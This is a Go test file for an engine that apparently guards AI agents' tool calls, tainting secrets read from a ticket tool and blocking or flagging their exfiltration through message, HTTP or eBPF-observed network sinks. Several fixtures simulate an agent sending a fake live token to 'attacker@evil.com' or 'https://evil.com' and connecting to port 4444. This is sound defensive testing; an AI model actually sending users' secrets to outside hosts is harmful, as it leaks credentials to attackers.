package engine

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/yxshwanth/Interlock/internal/config"
	"github.com/yxshwanth/Interlock/internal/model"
)

// testSink captures emitted evidence records for assertions.
type testSink struct {
	records []model.EvidenceRecord
}

func (s *testSink) Emit(rec model.EvidenceRecord) error {
	s.records = append(s.records, rec)
	return nil
}

func newTestEngine(mode string) (*Engine, *testSink) {
	cfg := &config.Config{
		Enforcement: mode,
		Servers: []config.ServerConfig{
			{ID: "tickets", Command: "./tickets", ProvidesTags: []string{"sensitive_source"}},
			{ID: "messenger", Command: "./messenger", ProvidesTags: []string{"external_sink"}},
		},
		ToolTags: map[string][]string{
			"read_ticket":  {"sensitive_source"},
			"send_message": {"external_sink"},
			"http_post":    {"external_sink"},
		},
		UntrustedOrigins: struct {
			ToolResults bool `yaml:"tool_results"`
			WebFetches  bool `yaml:"web_fetches"`
		}{ToolResults: true},
	}

	store := NewSessionStore()
	tagger := NewTagger(cfg)
	sink := &testSink{}
	eng := NewEngine(store, tagger, mode, sink)

	return eng, sink
}

// makeResultEvent creates an InterceptedEvent simulating a server->agent result.
func makeResultEvent(sessionID, toolName, serverID string, seq uint64, resultJSON string) model.InterceptedEvent {
	return model.InterceptedEvent{
		SessionID: sessionID,
		Seq:       seq,
		Direction: model.ServerToAgent,
		Method:    "tools/call",
		ToolName:  toolName,
		ServerID:  serverID,
		Result:    json.RawMessage(resultJSON),
		Decision:  "forwarded",
	}
}

// makeRequestEvent creates an InterceptedEvent simulating an agent->server tools/call.
func makeRequestEvent(sessionID, toolName, serverID string, seq uint64, argsJSON string) model.InterceptedEvent {
	return model.InterceptedEvent{
		SessionID: sessionID,
		Seq:       seq,
		Direction: model.AgentToServer,
		Method:    "tools/call",
		ToolName:  toolName,
		ServerID:  serverID,
		ToolArgs:  json.RawMessage(argsJSON),
		Decision:  "pending",
	}
}

func TestEngine_IngestResult_LightsSensitiveSource(t *testing.T) {
	eng, _ := newTestEngine("block")

	ev := makeResultEvent("s1", "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Customer Auth Token: sk-live-testtoken123456789"}]}`)

	eng.IngestResult(ev)

	state := eng.store.Get("s1")
	if state == nil {
		t.Fatal("session not created")
	}
	if !state.Legs.SensitiveSourceTouched.Lit {
		t.Fatal("sensitive_source_touched should be lit")
	}
	if state.Legs.SensitiveSourceTouched.TriggerSeq != 1 {
		t.Fatalf("expected trigger seq 1, got %d", state.Legs.SensitiveSourceTouched.TriggerSeq)
	}
}

func TestEngine_IngestResult_LightsUntrustedContent(t *testing.T) {
	eng, _ := newTestEngine("block")

	ev := makeResultEvent("s1", "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"some data"}]}`)

	eng.IngestResult(ev)

	state := eng.store.Get("s1")
	if !state.Legs.UntrustedContentPresent.Lit {
		t.Fatal("untrusted_content_present should be lit on any tool result (v0.1)")
	}
}

func TestEngine_IngestResult_ExtractsTaintedValues(t *testing.T) {
	eng, _ := newTestEngine("block")

	ev := makeResultEvent("s1", "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Auth Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef\nAccount: acct_prod_jane_7291"}]}`)

	eng.IngestResult(ev)

	state := eng.store.Get("s1")
	if len(state.Tainted) < 2 {
		t.Fatalf("expected at least 2 tainted values, got %d", len(state.Tainted))
	}

	foundKey := false
	foundAcct := false
	for _, tv := range state.Tainted {
		if tv.Value == "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef" {
			foundKey = true
		}
		if tv.Value == "acct_prod_jane_7291" {
			foundAcct = true
		}
	}
	if !foundKey {
		t.Error("expected to find the API key in tainted values")
	}
	if !foundAcct {
		t.Error("expected to find the account ID in tainted values")
	}
}

func TestEngine_IngestResult_NonSensitiveSource_NoTaint(t *testing.T) {
	eng, _ := newTestEngine("block")

	ev := makeResultEvent("s1", "send_message", "messenger", 1,
		`{"content":[{"type":"text","text":"Message sent to alice"}]}`)

	eng.IngestResult(ev)

	state := eng.store.Get("s1")
	if state.Legs.SensitiveSourceTouched.Lit {
		t.Fatal("sensitive_source_touched should NOT be lit for messenger")
	}
	if len(state.Tainted) != 0 {
		t.Fatalf("no tainted values should be extracted from non-sensitive source, got %d", len(state.Tainted))
	}
	// But untrusted_content_present should still light (all results untrusted in v0.1).
	if !state.Legs.UntrustedContentPresent.Lit {
		t.Fatal("untrusted_content_present should be lit for any result")
	}
}

func TestEngine_EvaluateRequest_NonSink_Allow(t *testing.T) {
	eng, _ := newTestEngine("block")

	ev := makeRequestEvent("s1", "read_ticket", "tickets", 1, `{"ticket_id":"T-1"}`)

	dec := eng.EvaluateRequest(ev)
	if !dec.Allow {
		t.Fatal("non-sink tool should be allowed")
	}
}

func TestEngine_EvaluateRequest_SinkNoLegs_Allow(t *testing.T) {
	eng, _ := newTestEngine("block")

	ev := makeRequestEvent("s1", "send_message", "messenger", 1, `{"to":"alice","body":"hello"}`)

	dec := eng.EvaluateRequest(ev)
	if !dec.Allow {
		t.Fatal("sink with no other legs lit should be allowed")
	}

	state := eng.store.Get("s1")
	if !state.Legs.ExternalSinkInvoked.Lit {
		t.Fatal("external_sink_invoked should be lit after evaluating a sink call")
	}
}

func TestEngine_FullPipeline_BLOCKED(t *testing.T) {
	eng, sink := newTestEngine("block")
	sid := "pipeline-block"

	// Step 1: Ingest sensitive source result (lights 2 legs + extracts taint).
	result := makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}]}`)
	eng.IngestResult(result)

	state := eng.store.Get(sid)
	if !state.Legs.SensitiveSourceTouched.Lit {
		t.Fatal("sensitive_source_touched should be lit")
	}
	if !state.Legs.UntrustedContentPresent.Lit {
		t.Fatal("untrusted_content_present should be lit")
	}
	if len(state.Tainted) == 0 {
		t.Fatal("tainted values should be extracted")
	}

	// Step 2: Agent tries to exfil the token via send_message.
	sinkCall := makeRequestEvent(sid, "send_message", "messenger", 2,
		`{"to":"attacker@evil.com","body":"sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}`)
	dec := eng.EvaluateRequest(sinkCall)

	if dec.Allow {
		t.Fatal("expected BLOCKED (all legs lit + overlap)")
	}
	if dec.Verdict != model.VerdictExfil {
		t.Fatalf("expected EXFIL verdict, got %q", dec.Verdict)
	}
	if dec.Action != model.ActionPrevented {
		t.Fatalf("expected action=prevented, got %q", dec.Action)
	}
	if dec.Evidence == nil {
		t.Fatal("expected evidence record")
	}
	if dec.Evidence.ValueOverlap == nil {
		t.Fatal("expected value overlap hit in evidence")
	}
	if dec.Evidence.Verdict != model.VerdictExfil {
		t.Fatalf("expected evidence verdict EXFIL, got %q", dec.Evidence.Verdict)
	}
	if dec.Evidence.Action != model.ActionPrevented {
		t.Fatalf("expected evidence action=prevented, got %q", dec.Evidence.Action)
	}
	if dec.Evidence.Variant != model.VariantA {
		t.Fatalf("expected variant A, got %q", dec.Evidence.Variant)
	}

	// Verify evidence was emitted to the sink.
	if len(sink.records) != 1 {
		t.Fatalf("expected 1 evidence record, got %d", len(sink.records))
	}
	if sink.records[0].Verdict != model.VerdictExfil {
		t.Fatalf("sink record verdict: expected EXFIL, got %q", sink.records[0].Verdict)
	}

	// Verify session state.
	state = eng.store.Get(sid)
	if state.Status != model.Tripped {
		t.Fatalf("expected session status Tripped, got %q", state.Status)
	}
}

func TestEngine_FullPipeline_FLAGGED_NoOverlap(t *testing.T) {
	eng, sink := newTestEngine("block")
	sid := "pipeline-flag"

	// Step 1: Ingest sensitive source result.
	result := makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}]}`)
	eng.IngestResult(result)

	// Step 2: Agent calls a sink but with different content (no overlap).
	sinkCall := makeRequestEvent(sid, "send_message", "messenger", 2,
		`{"to":"alice","body":"hello, nothing secret here"}`)
	dec := eng.EvaluateRequest(sinkCall)

	if dec.Allow {
		t.Fatal("expected blocked even for FLAGGED in block mode")
	}
	if dec.Verdict != model.VerdictSuspicious {
		t.Fatalf("expected SUSPICIOUS verdict (no overlap), got %q", dec.Verdict)
	}
	if dec.Action != model.ActionPrevented {
		t.Fatalf("expected action=prevented in block mode, got %q", dec.Action)
	}
	if dec.Evidence.ValueOverlap != nil {
		t.Fatal("expected no value overlap for SUSPICIOUS")
	}

	if len(sink.records) != 1 {
		t.Fatalf("expected 1 evidence record, got %d", len(sink.records))
	}
}

func TestEngine_MonitorMode_AllowButVerdictPresent(t *testing.T) {
	eng, sink := newTestEngine("monitor")
	sid := "pipeline-monitor"

	// Ingest sensitive result.
	result := makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}]}`)
	eng.IngestResult(result)

	// Sink call with overlap.
	sinkCall := makeRequestEvent(sid, "send_message", "messenger", 2,
		`{"to":"attacker","body":"sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}`)
	dec := eng.EvaluateRequest(sinkCall)

	if !dec.Allow {
		t.Fatal("monitor mode should always allow")
	}
	if dec.Verdict != model.VerdictExfil {
		t.Fatalf("verdict should still be EXFIL even in monitor mode, got %q", dec.Verdict)
	}
	if dec.Action != model.ActionAllowed {
		t.Fatalf("action should be allowed_monitor in monitor mode, got %q", dec.Action)
	}
	if dec.Evidence == nil {
		t.Fatal("evidence should still be produced in monitor mode")
	}
	if dec.Evidence.Action != model.ActionAllowed {
		t.Fatalf("evidence action should be allowed_monitor, got %q", dec.Evidence.Action)
	}

	if len(sink.records) != 1 {
		t.Fatalf("evidence should be emitted in monitor mode, got %d records", len(sink.records))
	}
}

func TestEngine_LegsAreSticky(t *testing.T) {
	eng, _ := newTestEngine("block")
	sid := "sticky"

	// Light sensitive_source via first result.
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-aaabbb1234567890"}]}`))

	// Ingest a non-sensitive result — should not reset sensitive_source leg.
	eng.IngestResult(makeResultEvent(sid, "send_message", "messenger", 2,
		`{"content":[{"type":"text","text":"Message sent"}]}`))

	state := eng.store.Get(sid)
	if !state.Legs.SensitiveSourceTouched.Lit {
		t.Fatal("sensitive_source_touched should remain lit (sticky)")
	}
	if state.Legs.SensitiveSourceTouched.TriggerSeq != 1 {
		t.Fatalf("trigger seq should remain 1 (first event), got %d", state.Legs.SensitiveSourceTouched.TriggerSeq)
	}
}

func TestEngine_Timeline(t *testing.T) {
	eng, _ := newTestEngine("block")
	sid := "timeline"

	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"data"}]}`))
	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 2,
		`{"content":[{"type":"text","text":"more data"}]}`))
	eng.EvaluateRequest(makeRequestEvent(sid, "send_message", "messenger", 3,
		`{"to":"x","body":"y"}`))

	state := eng.store.Get(sid)
	if len(state.Timeline) != 3 {
		t.Fatalf("expected 3 timeline entries, got %d", len(state.Timeline))
	}
	for i, expected := range []uint64{1, 2, 3} {
		if state.Timeline[i] != expected {
			t.Errorf("timeline[%d]: expected %d, got %d", i, expected, state.Timeline[i])
		}
	}
}

func TestEngine_EvidenceRecord_Fields(t *testing.T) {
	eng, sink := newTestEngine("block")
	sid := "evidence-fields"

	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}]}`))

	eng.EvaluateRequest(makeRequestEvent(sid, "http_post", "messenger", 2,
		`{"url":"https://evil.com","body":"sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}`))

	if len(sink.records) != 1 {
		t.Fatalf("expected 1 evidence record, got %d", len(sink.records))
	}

	rec := sink.records[0]
	if rec.SessionID != sid {
		t.Errorf("session ID: expected %q, got %q", sid, rec.SessionID)
	}
	if rec.TripTS == 0 {
		t.Error("TripTS should be set")
	}
	if rec.Variant != model.VariantA {
		t.Errorf("variant: expected A_chained_tool, got %q", rec.Variant)
	}
	if rec.Confidence <= 0 {
		t.Error("confidence should be positive")
	}
	if !rec.Legs.SensitiveSourceTouched.Lit {
		t.Error("evidence legs should show sensitive_source_touched lit")
	}
	if !rec.Legs.UntrustedContentPresent.Lit {
		t.Error("evidence legs should show untrusted_content_present lit")
	}
	if !rec.Legs.ExternalSinkInvoked.Lit {
		t.Error("evidence legs should show external_sink_invoked lit")
	}
	if rec.SinkCall == nil {
		t.Error("SinkCall should be populated")
	}
	if rec.ValueOverlap == nil {
		t.Error("ValueOverlap should be populated for BLOCKED")
	}
	if len(rec.Timeline) == 0 {
		t.Error("Timeline should have entries")
	}

	// Verify it serializes cleanly.
	data, err := json.Marshal(rec)
	if err != nil {
		t.Fatalf("evidence record should marshal to JSON: %v", err)
	}
	if len(data) == 0 {
		t.Fatal("serialized evidence should not be empty")
	}
}

func TestEngine_Suspicious_BlockMode_StillBlocks(t *testing.T) {
	eng, sink := newTestEngine("block")
	sid := "suspicious-block"

	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}]}`))

	dec := eng.EvaluateRequest(makeRequestEvent(sid, "send_message", "messenger", 2,
		`{"to":"alice","body":"hey, can you check the dashboard?"}`))

	if dec.Allow {
		t.Fatal("SUSPICIOUS verdict should still block in block mode")
	}
	if dec.Verdict != model.VerdictSuspicious {
		t.Fatalf("expected SUSPICIOUS verdict, got %q", dec.Verdict)
	}
	if dec.Action != model.ActionPrevented {
		t.Fatalf("expected action=prevented, got %q", dec.Action)
	}
	if dec.Evidence == nil {
		t.Fatal("evidence should be emitted for SUSPICIOUS")
	}
	if len(sink.records) != 1 {
		t.Fatalf("expected 1 evidence record, got %d", len(sink.records))
	}
	if !strings.Contains(dec.Reason, "SUSPICIOUS") {
		t.Fatalf("reason should mention SUSPICIOUS, got %q", dec.Reason)
	}
}

func TestEngine_Suspicious_BlockMode_EvidenceComplete(t *testing.T) {
	eng, sink := newTestEngine("block")
	sid := "suspicious-evidence"

	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}]}`))

	eng.EvaluateRequest(makeRequestEvent(sid, "http_post", "messenger", 2,
		`{"url":"https://harmless.example.com","body":"no secrets here"}`))

	if len(sink.records) != 1 {
		t.Fatalf("expected 1 evidence record, got %d", len(sink.records))
	}

	rec := sink.records[0]
	if rec.Verdict != model.VerdictSuspicious {
		t.Fatalf("expected SUSPICIOUS verdict, got %q", rec.Verdict)
	}
	if rec.Action != model.ActionPrevented {
		t.Fatalf("expected action=prevented, got %q", rec.Action)
	}
	if rec.ValueOverlap != nil {
		t.Fatal("SUSPICIOUS should have no value overlap")
	}
	if rec.Confidence != 0.6 {
		t.Fatalf("expected confidence 0.6, got %.2f", rec.Confidence)
	}
	if !rec.Legs.SensitiveSourceTouched.Lit {
		t.Error("sensitive_source_touched should be lit")
	}
	if !rec.Legs.UntrustedContentPresent.Lit {
		t.Error("untrusted_content_present should be lit")
	}
	if !rec.Legs.ExternalSinkInvoked.Lit {
		t.Error("external_sink_invoked should be lit")
	}
	if len(rec.Timeline) == 0 {
		t.Error("timeline should have entries")
	}
}

func TestEngine_Suspicious_MonitorMode_Allows(t *testing.T) {
	eng, sink := newTestEngine("monitor")
	sid := "suspicious-monitor"

	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}]}`))

	dec := eng.EvaluateRequest(makeRequestEvent(sid, "send_message", "messenger", 2,
		`{"to":"alice","body":"nothing secret"}`))

	if !dec.Allow {
		t.Fatal("SUSPICIOUS in monitor mode should allow")
	}
	if dec.Verdict != model.VerdictSuspicious {
		t.Fatalf("expected SUSPICIOUS verdict, got %q", dec.Verdict)
	}
	if dec.Action != model.ActionAllowed {
		t.Fatalf("expected action=allowed_monitor, got %q", dec.Action)
	}
	if dec.Evidence == nil {
		t.Fatal("evidence should still be produced in monitor mode")
	}
	if dec.Evidence.Action != model.ActionAllowed {
		t.Fatalf("evidence action should be allowed_monitor, got %q", dec.Evidence.Action)
	}
	if len(sink.records) != 1 {
		t.Fatalf("expected 1 evidence record emitted, got %d", len(sink.records))
	}
}

// --- Variant B (eBPF / IngestSyscall) tests ---

func TestEngine_IngestSyscall_LightsExternalSink(t *testing.T) {
	eng, _ := newTestEngine("block")
	sid := "ebpf-sink"

	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}]}`))

	state := eng.store.Get(sid)
	if state.Legs.ExternalSinkInvoked.Lit {
		t.Fatal("external_sink_invoked should NOT be lit before syscall")
	}

	ev := model.SyscallEvent{
		PID:       12345,
		Comm:      "exfil-server",
		Syscall:   "connect",
		DestIP:    "203.0.113.66",
		DestPort:  4444,
		SessionID: sid,
	}
	eng.IngestSyscall(ev)

	state = eng.store.Get(sid)
	if !state.Legs.ExternalSinkInvoked.Lit {
		t.Fatal("external_sink_invoked should be lit after eBPF connect()")
	}
	if !strings.Contains(state.Legs.ExternalSinkInvoked.Detail, "203.0.113.66:4444") {
		t.Fatalf("detail should mention dest, got %q", state.Legs.ExternalSinkInvoked.Detail)
	}
}

func TestEngine_IngestSyscall_TripsWhenAllLegsLit(t *testing.T) {
	eng, sink := newTestEngine("block")
	sid := "ebpf-trip"

	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}]}`))

	ev := model.SyscallEvent{
		PID:       99,
		Comm:      "evil",
		Syscall:   "connect",
		DestIP:    "10.0.0.1",
		DestPort:  8080,
		SessionID: sid,
	}
	dec := eng.IngestSyscall(ev)

	if dec.Allow {
		t.Fatal("should not allow when trifecta trips via eBPF")
	}
	if dec.Verdict != model.VerdictSuspicious {
		t.Fatalf("expected SUSPICIOUS (no value overlap for syscalls), got %q", dec.Verdict)
	}
	if dec.Action != model.ActionContained {
		t.Fatalf("expected action=contained_by_kill, got %q", dec.Action)
	}
	if dec.Evidence == nil {
		t.Fatal("evidence should be emitted")
	}
	if dec.Evidence.Variant != model.VariantB {
		t.Fatalf("expected variant B, got %q", dec.Evidence.Variant)
	}

	if len(sink.records) != 1 {
		t.Fatalf("expected 1 evidence record, got %d", len(sink.records))
	}
	rec := sink.records[0]
	if rec.Variant != model.VariantB {
		t.Fatalf("evidence variant should be B, got %q", rec.Variant)
	}

	state := eng.store.Get(sid)
	if state.Status != model.Tripped {
		t.Fatalf("session should be tripped, got %q", state.Status)
	}
}

func TestEngine_IngestSyscall_NoLegs_NoTrip(t *testing.T) {
	eng, sink := newTestEngine("block")

	eng.store.GetOrCreate("empty-session")

	ev := model.SyscallEvent{
		PID:       42,
		Comm:      "curl",
		Syscall:   "connect",
		DestIP:    "1.1.1.1",
		DestPort:  443,
		SessionID: "empty-session",
	}
	dec := eng.IngestSyscall(ev)

	if !dec.Allow {
		t.Fatal("should allow when only one leg lit")
	}
	if len(sink.records) != 0 {
		t.Fatal("no evidence should be emitted when not tripped")
	}
}

func TestEngine_IngestSyscall_TimelineFused(t *testing.T) {
	eng, sink := newTestEngine("block")
	sid := "ebpf-timeline"

	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}]}`))

	ev := model.SyscallEvent{
		PID:       77,
		Comm:      "bad-server",
		Syscall:   "connect",
		DestIP:    "203.0.113.66",
		DestPort:  4444,
		SessionID: sid,
	}
	eng.IngestSyscall(ev)

	if len(sink.records) != 1 {
		t.Fatalf("expected 1 evidence record, got %d", len(sink.records))
	}

	rec := sink.records[0]
	if len(rec.Timeline) == 0 {
		t.Fatal("timeline should not be empty")
	}

	hasIntercepted := false
	hasSyscall := false
	for _, item := range rec.Timeline {
		switch item.Kind {
		case "intercepted":
			hasIntercepted = true
		case "syscall":
			hasSyscall = true
		}
	}
	if !hasIntercepted {
		t.Error("timeline should have intercepted items from proxy")
	}
	if !hasSyscall {
		t.Error("timeline should have a syscall item from eBPF")
	}
}

func TestEngine_IngestSyscall_RequiresSessionID(t *testing.T) {
	eng, sink := newTestEngine("block")
	sid := "explicit-session"

	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
		`{"content":[{"type":"text","text":"Token: sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"}]}`))

	ev := model.SyscallEvent{
		PID:      55,
		Comm:     "exfil",
		Syscall:  "connect",
		DestIP:   "10.0.0.1",
		DestPort: 9999,
	}
	dec := eng.IngestSyscall(ev)
	if !dec.Allow {
		t.Fatal("should no-op when SessionID is missing")
	}
	if len(sink.records) != 0 {
		t.Fatalf("expected no evidence without session attribution, got %d", len(sink.records))
	}

	ev.SessionID = sid
	dec = eng.IngestSyscall(ev)
	if dec.Allow {
		t.Fatal("should trip when SessionID is set")
	}
	if len(sink.records) != 1 {
		t.Fatalf("expected 1 evidence record, got %d", len(sink.records))
	}
	if sink.records[0].SessionID != sid {
		t.Fatalf("evidence should reference session %q, got %q", sid, sink.records[0].SessionID)
	}
}
